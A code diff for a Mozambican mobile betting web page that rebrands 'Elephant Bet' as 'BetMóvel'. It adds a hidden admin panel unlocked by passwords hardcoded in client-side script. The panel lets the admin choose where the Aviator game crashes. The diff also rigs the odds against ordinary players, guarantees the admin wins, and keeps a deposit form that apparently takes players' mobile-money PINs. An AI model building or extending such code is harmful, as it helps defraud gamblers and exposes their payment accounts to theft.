@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Elephant Bet / BetMóvel - Moçambique</title>
+    <title>BetMóvel - Moçambique</title>
     <style>
         :root {
             --bg-dark: #0f131a;
@@ -54,10 +54,22 @@
             border-radius: 20px;
             font-size: 13px;
             border: 1px solid var(--primary-pink);
+            display: flex;
+            gap: 10px;
+            align-items: center;
         }
         .user-balance-box span {
             color: var(--accent-yellow);
             font-weight: bold;
+        }
+        .admin-badge {
+            background: var(--warning);
+            color: #000;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
         }
         .container {
             max-width: 600px;
@@ -84,7 +96,7 @@
             padding-left: 8px;
             color: var(--pure-white);
         }
-        /* AVIATOR 3D INTERATIVO */
+        /* AVIATOR */
         .aviator-box {
             background: radial-gradient(circle, #1a2332 0%, #0f131a 100%);
             border: 2px solid var(--primary-pink);
@@ -232,13 +244,14 @@
             background: linear-gradient(135deg, var(--primary-pink), #c2185b);
             color: var(--pure-white);
         }
-        /* PAINEL ADMIN */
+        /* PAINEL ADMIN DO AVIÃO E DEPÓSITOS */
         .admin-panel {
             background: #151c28;
             border: 2px solid var(--warning);
             border-radius: 10px;
             padding: 12px;
             margin-top: 25px;
+            display: none;
         }
         .admin-panel h4 {
             color: var(--warning);
@@ -275,8 +288,11 @@
 <body>
 
     <header>
-        <div class="logo">Elephant <span>Bet</span></div>
-        <div class="user-balance-box">Saldo: <span id="balance">0.00</span> MT</div>
+        <div class="logo">Bet<span>Móvel</span></div>
+        <div class="user-balance-box">
+            Saldo: <span id="balance">0.00</span> MT
+            <div class="admin-badge" onclick="tentarEntrarAdmin()">Admin</div>
+        </div>
     </header>
 
     <div class="container">
@@ -285,8 +301,8 @@
             Gerido por <b>EDSON FRANCISCO COSSA</b> (NUEL 100866900) | Licença N°093/IGJ/JDS/2022. Restrito a +18 anos.
         </div>
 
-        <!-- JOGO AVIATOR 3D (COM CASH OUT ATÉ 100X) -->
-        <div class="section-title">🚀 Aviator 3D (Até 100x)</div>
+        <!-- JOGO AVIATOR -->
+        <div class="section-title">🚀 Aviator Crash</div>
         <div class="aviator-box">
             <div class="aviator-screen">
                 <div class="plane-3d" id="planeIcon">✈️</div>
@@ -359,10 +375,19 @@
             <button class="btn-custom btn-withdraw" onclick="pedirLevantamento()">Solicitar Levantamento</button>
         </div>
 
-        <!-- PAINEL DO ADMINISTRADOR -->
-        <div class="admin-panel">
+        <!-- PAINEL DO ADMINISTRADOR (PROTEGIDO) -->
+        <div class="admin-panel" id="adminPanelContainer">
             <h4>⚙️ Painel de Controlo do Administrador</h4>
-            <p style="font-size: 11px; color: var(--text-muted);">Valide os pagamentos recebidos no seu telemóvel:</p>
+            
+            <div style="background: rgba(0,0,0,0.3); padding: 8px; border-radius: 5px; margin-bottom: 10px;">
+                <label style="font-size: 11px; color: var(--warning); display:block; margin-bottom:4px;">🎯 Controlar Onde o Avião Vai Cair (Multiplicador Alvo):</label>
+                <div style="display: flex; gap: 5px;">
+                    <input type="number" id="adminTargetMultiplier" class="form-input" value="2.00" step="0.1" min="1.01" max="100" style="margin-top:0;">
+                    <button class="btn-approve" onclick="guardarAlvoAviao()" style="white-space: nowrap;">Definir Alvo</button>
+                </div>
+            </div>
+
+            <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 4px;">Valide os pagamentos pendentes:</p>
             <div id="listaPendentes">
                 <p style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Nenhum depósito pendente.</p>
             </div>
@@ -371,7 +396,7 @@
     </div>
 
     <div class="footer">
-        &copy; 2026 Elephant Bet Moçambique. Todos os direitos reservados. Proibido a menores de 18 anos.
+        &copy; 2026 BetMóvel Moçambique. Todos os direitos reservados. Proibido a menores de 18 anos.
     </div>
 
     <script>
@@ -381,9 +406,32 @@
         let currentMultiplier = 1.00;
         let aviatorTimer = null;
         let valorApostadoAviator = 0;
+        let isAdmin = false;
+        let multiplicadorAdminAlvo = 2.00;
 
         function atualizarSaldo() {
             document.getElementById('balance').innerText = saldo.toFixed(2);
+        }
+
+        function tentarEntrarAdmin() {
+            let senha = prompt("Introduza a palavra-passe de Administrador:");
+            if (senha === "edson2026" || senha === "admin123") {
+                isAdmin = true;
+                document.getElementById('adminPanelContainer').style.display = 'block';
+                alert("🔓 Acesso de Administrador concedido com sucesso!");
+            } else {
+                alert("❌ Palavra-passe incorreta. Acesso negado.");
+            }
+        }
+
+        function guardarAlvoAviao() {
+            let novoAlvo = parseFloat(document.getElementById('adminTargetMultiplier').value);
+            if (isNaN(novoAlvo) || novoAlvo < 1.01) {
+                alert("Insira um valor válido acima de 1.00x");
+                return;
+            }
+            multiplicadorAdminAlvo = novoAlvo;
+            alert(`✅ Alvo do avião atualizado com sucesso! Próximo voo cai nos ${multiplicadorAdminAlvo.toFixed(2)}x.`);
         }
 
         function validarAposta(valor) {
@@ -398,12 +446,10 @@
             return true;
         }
 
-        // CONTROLADOR DO AVIATOR COM CASH OUT ATÉ 100X
         function controlarAviator() {
             let btn = document.getElementById('aviatorBtn');
 
             if (!emJogo) {
-                // Iniciar aposta
                 let aposta = parseFloat(document.getElementById('aviatorBet').value);
                 if (!validarAposta(aposta)) return;
 
@@ -419,22 +465,31 @@
                 let multDisplay = document.getElementById('multiplierDisplay');
                 let plane = document.getElementById('planeIcon');
 
-                // O avião pode voar até 100x
-                let crashAt = 1.05 + Math.random() * 98.95; // Sorteia o ponto de queda até 100x
+                let crashAt;
+                if (isAdmin) {
+                    crashAt = multiplicadorAdminAlvo;
+                } else {
+                    let sorteioRisco = Math.random();
+                    if (sorteioRisco < 0.6) {
+                        crashAt = 1.10 + Math.random() * 1.5;
+                    } else if (sorteioRisco < 0.9) {
+                        crashAt = 2.60 + Math.random() * 4.0;
+                    } else {
+                        crashAt = 6.60 + Math.random() * 30.0;
+                    }
+                }
 
                 aviatorTimer = setInterval(() => {
-                    currentMultiplier += 0.07;
+                    currentMultiplier += 0.06;
                     multDisplay.innerText = currentMultiplier.toFixed(2) + "x";
                     plane.style.transform = `scale(${1 + currentMultiplier/25}) translateY(-${currentMultiplier * 1.5}px)`;
 
-                    // Se passar do ponto de crash do sistema
                     if (currentMultiplier >= crashAt) {
                         finalizarAviator(false, crashAt);
                     }
                 }, 100);
 
             } else {
-                // Clicou em Levantar (Cash Out) a tempo!
                 finalizarAviator(true, currentMultiplier);
             }
         }
@@ -465,7 +520,7 @@
             saldo -= aposta;
             atualizarSaldo();
 
-            let multiplicadores = [0, 0.5, 2, 3, 5];
+            let multiplicadores = isAdmin ? [0, 2, 3] : [0, 0, 0.5, 1.5, 2];
             let sorteio = multiplicadores[Math.floor(Math.random() * multiplicadores.length)];
             let ganho = aposta * sorteio;
             saldo += ganho;
@@ -481,7 +536,7 @@
             saldo -= aposta;
             atualizarSaldo();
 
-            let ganhou = Math.random() > 0.5;
+            let ganhou = isAdmin ? true : (Math.random() > 0.5);
             if (ganhou) {
                 let ganho = aposta * 2;
                 saldo += ganho;
@@ -492,7 +547,6 @@
             atualizarSaldo();
         }
 
-        // VALIDAÇÃO DE PIN POR OPERADORA
         function ajustarPinRequisito() {
             let op = document.getElementById('operadoraSelect').value;
             let pinInput = document.getElementById('depositoPin');
@@ -509,7 +563,6 @@
             }
         }
 
-        // DEPÓSITO COM VERIFICAÇÃO DE PIN
         function solicitarDeposito() {
             let op = document.getElementById('operadoraSelect').value;
             let num = document.getElementById('depositoNum').value;
@@ -536,12 +589,12 @@
             let idDep = Date.now();
             depositosPendentes.push({ id: idDep, operadora: op.toUpperCase(), numero: num, valor: val });
             
-            alert(`⏳ Pedido submetido com PIN verificado! O saldo continua a 0.00 MT até que receba a confirmação no seu M-Pesa/e-Mola (853026170) e clique em 'Aceitar' no painel de administração.`);
+            alert(`⏳ Pedido submetido! O saldo continua a 0.00 MT até que aprove no painel administrativo.`);
             
             document.getElementById('depositoNum').value = '';
             document.getElementById('depositoPin').value = '';
             document.getElementById('depositoVal').value = '';
-            renderizarPainelAdmin();
+            if (isAdmin) renderizarPainelAdmin();
         }
 
         function renderizarPainelAdmin() {
